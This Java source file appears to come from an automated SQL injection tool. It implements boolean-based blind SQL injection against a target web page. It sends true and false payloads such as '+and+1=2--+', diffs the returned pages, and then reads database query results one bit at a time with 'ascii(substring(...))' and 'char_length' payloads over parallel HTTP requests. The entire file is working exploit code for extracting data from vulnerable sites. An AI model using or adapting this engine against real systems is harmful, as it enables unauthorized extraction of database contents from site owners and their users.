package mvc.model.blind;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

import exception.PreparationException;
import exception.StoppableException;

import mvc.model.InjectionModel;
import mvc.model.Interruptable;
import mvc.model.Stoppable;

/**
 * This module runs injection with method blind, which is defined as the following:
 *     - if SQL query is true: page A is displayed,
 *     - if SQL query is false: page B is displayed,
 * First it tests if blind really works on the web server, then it processes the SQL query
 * one character at a time by using bit checking, the parsing data like SQLihhABCDEFjj31hhiLQS is always expected,
 * Each character is generated one bit at a time, so one HTTP request gives 0 or 1, and 8 requests gives 1 character
 * e.g with string 'SQLi', after 4*8 HTTP requests, 01010011=>S 01010001=>Q 01001100=>L 01101001=>i
 */
public class BlindInjection {
	// Source code of the TRUE web page (usually ?id=1)
	private String blankTrueMark;
	
	/**
	 *  List of string differences found in all the FALSE queries, compared to the TRUE page.
	 *  Each FALSE pages should contain at least the same string, which shouldn't be present in all
	 *  the TRUE queries. 
	 */
	public List<diff_match_patch.Diff> constantFalseMark;

	// Reference to the model for proxy setting, stop preparation, communication with the view, HTTP requests
	private InjectionModel injectionModel;

	public BlindInjection(InjectionModel newModel){
		injectionModel = newModel;
		
		// Define the proxy settings
		if(injectionModel.isProxyfied){
			System.setProperty("http.proxyHost", injectionModel.proxyAdress);
			System.setProperty("http.proxyPort", injectionModel.proxyPort);
		}

		// Call the SQL request which must be TRUE (usually ?id=1)
		blankTrueMark = callUrl("");
		
		// Every FALSE SQL statements will be checked, more statements means a more robust application 
		String[] falseTest = {"true=false","true%21=true","false%21=false","1=2","1%21=1","2%21=2"};
				
		// Every TRUE SQL statements will be checked, more statements means a more robust application 
		String[] trueTest = {"true=true","false=false","true%21=false","1=1","2=2","1%21=2"};
		
		// Check if the user wants to stop the preparation
		if(injectionModel.stopFlag)return;
		
		/**
		 *  Parallelize the call to the FALSE statements, it will use inject() from the model
		 */
		ExecutorService executorFalseMark = Executors.newCachedThreadPool();
		List<BlindCallable> listCallableFalse = new ArrayList<BlindCallable>();
		for (String urlTest: falseTest){
			listCallableFalse.add(new BlindCallable("+and+"+urlTest+"--+"));
		}
		// Begin the url requests
		List<Future<BlindCallable>> listFalseMark;
		try {
			listFalseMark = executorFalseMark.invokeAll(listCallableFalse);
		} catch (InterruptedException e1) {
			e1.printStackTrace();
			return;
		}
		executorFalseMark.shutdown();
		
		/**
		 * Delete junk from results of FALSE statements, keep only opcodes found in every FALSE pages
		 * Allow the user to stop the loop  
		 */
		try {
			constantFalseMark = ((BlindCallable) listFalseMark.get(0).get()).opcodes;
//			System.out.println(">>>false "+constantFalseMark);
			for(Future<BlindCallable> falseMark: listFalseMark){
				if(injectionModel.stopFlag)return;
				constantFalseMark.retainAll(((BlindCallable) falseMark.get()).opcodes);
			}
		} catch (InterruptedException e2) {
			e2.printStackTrace();
		} catch (ExecutionException e2) {
			e2.printStackTrace();
		}
//		System.out.println(">>>false-s "+constantFalseMark);
		
		
		if(injectionModel.stopFlag)return;

		/**
		 *  Parallelize the call to the TRUE statements, it will use inject() from the model
		 */
		ExecutorService executorTrueMark = Executors.newCachedThreadPool();
		List<BlindCallable> listCallableTrue = new ArrayList<BlindCallable>();
		for (String urlTest: trueTest){
			listCallableTrue.add(new BlindCallable(/*initialUrl+*/"+and+"+urlTest+"--+"));
		}
		// Begin the url requests
		List<Future<BlindCallable>> listTrueMark;
		try {
			listTrueMark = executorTrueMark.invokeAll(listCallableTrue);
		} catch (InterruptedException e1) {
			e1.printStackTrace();
			return;
		}
		executorTrueMark.shutdown();

		/**
		 * Remove TRUE opcodes in the FALSE opcodes, a significant FALSE statement shouldn't
		 * contain any TRUE opcode.
		 * Allow the user to stop the loop
		 */
		try {
//			System.out.println(">>>true "+constantTrueMark);
			for(Future<BlindCallable> trueMark: listTrueMark){
				if(injectionModel.stopFlag)return;
				constantFalseMark.removeAll(((BlindCallable) trueMark.get()).opcodes);
			}
		} catch (InterruptedException e2) {
			e2.printStackTrace();
		} catch (ExecutionException e2) {
			e2.printStackTrace();
		}
		
//		System.out.println(">>> "+constantFalseMark);
	}
	
	/**
	 * Process the whole blind injection, character by character, bit by bit
	 * @param inj SQL query
	 * @param interruptable Action a user can stop/pause/resume
	 * @param s Action a user can stop
	 * @return Final string: SQLiABCDEF...
	 * @throws StoppableException
	 */
	public String inject(String inj, Interruptable interruptable, Stoppable s) throws StoppableException{
		// Marker linked to a URL, indicate if that url checks the end of the SQL result
		final boolean IS_LENGTH_TEST = true;
		
		/**
		 *  Ordered list of the characters, each one represented by array of 8 bits
		 *  e.g bytes[0] => 01010011:S, bytes[1] => 01010001:Q ... 
		 */
		List<char[]> bytes = new ArrayList<char[]>();
		// Cursor for current character position
		int indexCharacter = 0;

		// Parallelize the URL requests
		ExecutorService taskExecutor = Executors.newCachedThreadPool();
        CompletionService<BlindCallable> taskCompletionService = new ExecutorCompletionService<BlindCallable>(taskExecutor);

        // First test: Does the SQL query return a result?
        taskCompletionService.submit(new BlindCallable("+and+char_length("+inj+")>0--+", IS_LENGTH_TEST));
        // Increment the number of active tasks
        int submittedTasks = 1;
        
        // Process the job until there is no more active task, in other word until all HTTP requests are done
        while( submittedTasks > 0 ){
        	// stop/pause/resume if user wants
        	if(s.isPreparationStopped() || (interruptable != null && interruptable.isInterrupted())){
        		taskExecutor.shutdown();

        		// Wait for termination
        		boolean success = false;
				try {
					success = taskExecutor.awaitTermination(0, TimeUnit.SECONDS);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
        		if (!success) {
        		    // awaitTermination timed out, interrupt everyone
        			taskExecutor.shutdownNow();
        		}

        		throw new StoppableException();
        	}
			try {
				// The URL call is done, get back the finished task
	        	BlindCallable currentCallable = taskCompletionService.take().get();
	        	// One task has ended, decrease active tasks by 1 
	        	submittedTasks--;
	        	/**
	        	 * If it's not the end of SQL result, then move character position by 1,
	        	 * define a new array of 8 undefined bit for the next character to search.
	        	 * Then add a new length verification, and all 8 bit requests
	        	 */
				if(currentCallable.isLengthTest){
					if( currentCallable.isTrue() ){
						indexCharacter++;
						// New undefined bits of the next character
						bytes.add(new char[]{'x','x','x','x','x','x','x','x'});
						// Test if it's the end of the line
						taskCompletionService.submit(new BlindCallable("+and+char_length("+inj+")>"+indexCharacter+"--+", IS_LENGTH_TEST));
						// Test the 8 bits at the next character position, save position and current bit for later
						for(int bit: new int[]{1,2,4,8,16,32,64,128}){
							taskCompletionService.submit(new BlindCallable("+and+ascii(substring("+inj+","+indexCharacter+",1))%26"+bit+"--+", indexCharacter, bit));
						}
						// Add all 9 new tasks
						submittedTasks += 9;
					}
				/**
				 * Process the url that checks bits,
				 * Retrieve the bits for that character, and change the bit from undefined to 0 or 1
				 */
				}else{
					// The bits linked to the url
					char[] e = bytes.get(currentCallable.currentIndex-1);
					// Define the bit
					e[(int) (8 - ( Math.log(2)+Math.log(currentCallable.currentBit) )/Math.log(2)) ] = currentCallable.isTrue() ? '1' : '0';
					
					// Inform the View if a array of bits is complete
					try{
                        int charCode = Integer.parseInt(new String(e), 2);
                        String str = new Character((char)charCode).toString();
                        injectionModel.new GUIThread("binary-message","\t"+new String(e)+"="+str).run();
                    }catch(NumberFormatException err){}
				}
			} catch (InterruptedException e) {
				e.printStackTrace();
			} catch (ExecutionException e) {
				e.printStackTrace();
			}
        }
        
        // End the job
        try {
	        taskExecutor.shutdown();
			taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
        
        // Build the complete final string from array of bits
		String result = "";
		for(char[] c: bytes){
			int charCode = Integer.parseInt(new String(c), 2);
			String str = new Character((char)charCode).toString();
			result += str;
		}	
//		System.out.println("nb caractères: "+indexChar);
//		System.out.println("résultat: "+result);
		// Return the final string
		return result;
	}
	
	/**
	 * Define a call HTTP to the server, requires the associated url, character position and bit
	 * Opcodes represents the differences between the TRUE page, and the resulting page  
	 */
	private class BlindCallable implements Callable<BlindCallable>{
		// The URL called 
		private String blindUrl;
		// Character position
		private int currentIndex;
		// Bit searched
		private int currentBit;
		// Default call used for bit test
		private boolean isLengthTest = false;
		// List of differences found between the TRUE page, and the present page
		private LinkedList<diff_match_patch.Diff> opcodes;
		
		// Constructor for preparation and blind confirmation
		BlindCallable(String newUrl){
			blindUrl = newUrl;
		}
		// Constructor for bit test
		BlindCallable(String newUrl, int newIndex, int newBit){
			this(newUrl);
			currentIndex = newIndex;
			currentBit = newBit;
		}
		// Constructor for length test
		BlindCallable(String newUrl, boolean newIsLengthTest){
			this(newUrl);
			isLengthTest = newIsLengthTest;
		}
		
		/**
		 * Declare a url call as positive or negative, confirm that nothing in the resulting page
		 * is also defined in the pages from every FALSE SQL queries 
		 * @return true if the current SQL test is confirmed
		 */
		public boolean isTrue() {
			for( diff_match_patch.Diff falseDiff: constantFalseMark){
				if(opcodes.contains(falseDiff)){
					return false;
				}
			}
			return true;
		}

		/**
		 * Process the URL HTTP call, with function inject() from the model
		 * Build the list of differences found between TRUE and the current page 
		 */
		@Override
		public BlindCallable call() throws Exception {		
			String ctnt = callUrl(blindUrl);
			opcodes = new diff_match_patch().diff_main(blankTrueMark, ctnt, true);
			new diff_match_patch().diff_cleanupEfficiency(opcodes);
			return this;
		}
	}
	
	// Run a HTTP call via the model
	public String callUrl(String urlString){
		return injectionModel.inject(injectionModel.insertionCharacter + urlString);
	}
	
	/**
	 * Start a new test to verify if blind works 
	 * @return true if blind method is confirmed on the web site
	 * @throws PreparationException
	 */
	public boolean isBlindInjectable() throws PreparationException{
		if(injectionModel.stopFlag)
			throw new PreparationException();
		BlindCallable blindTest = new BlindCallable("+and+0%2b1=1--+");
		try {
			blindTest.call();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return constantFalseMark != null && blindTest.isTrue() && constantFalseMark.size() > 0;
	}
}
